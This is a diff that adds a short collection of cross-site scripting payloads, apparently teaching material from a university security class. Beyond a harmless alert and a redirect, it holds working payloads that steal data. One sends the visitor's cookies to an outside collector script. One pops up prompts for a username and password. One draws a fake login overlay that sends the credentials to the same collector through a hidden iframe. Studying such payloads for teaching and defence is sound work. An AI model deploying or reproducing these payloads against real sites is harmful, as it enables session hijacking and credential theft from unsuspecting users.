@@ -1,0 +1,39 @@
+Simple Alert:
+-------------
+<script>alert("I am Brian of Nazareth and so is my wife.");</script>
+
+Redirection:
+------------
+<script>window.location = "http://www.cmu.edu/"</script>
+
+Capturing Cookie Data:
+----------------------
+<script> new Image().src="http://pawn.hss.cmu.edu/~hacker/catch.php?andrewid=YOUR_NAME_HERE&cookie="+encodeURI(document.cookie); </script>
+
+Login Data Capture:
+--------------------
+<script> username=prompt('Please enter your username',' '); password=prompt('Please enter your password',' '); document.write("<img src=\"http://pawn.hss.cmu.edu/~hacker/catch.php?username="+username+"&password="+password+"&perp=profh"+"\">"); </script>
+
+More Sophisticated Login:
+-------------------------
+<div style="position: absolute; width: 30%; z-index: 2; left: 35%; top: 40%; float:left; background-color:#C0C0C0" id="loginlayer"> 
+  <form method="POST" name="logonform" > 
+		<b>You must login to continue</b> 
+		<div align="center"> 
+		<table border="0" cellspacing="0" cellpadding="0"> 
+			<tr> <td>User:</td> <td><input name="userf" size="20"></td> </tr> 
+			<tr> <td>Password:</td> <td><input type="password" name="passwordf" size="20"></td> </tr> 
+		</table> </div> <p align="center">
+		<input type="button" value="Submit" onClick="submitandhide()"></p>
+	</form> 
+	<script> 
+	function submitandhide() {
+		document.getElementById("loginlayer").style.display = "none"; 
+		temprs = "user=" + document.logonf.userf.value + "&password=" + document.logonf.passwordf.value;
+		var iframe = document.createElement('IFRAME'); 
+		iframe.src = ("http://pawn.hss.cmu.edu/~hacker/catch.php?" + temprs); 
+		document.body.appendChild(iframe); 
+		//help from http://www.gnucitizen.org/blog/javascript-remoting-dangers/ 
+	} 
+	</script> 
+</div>
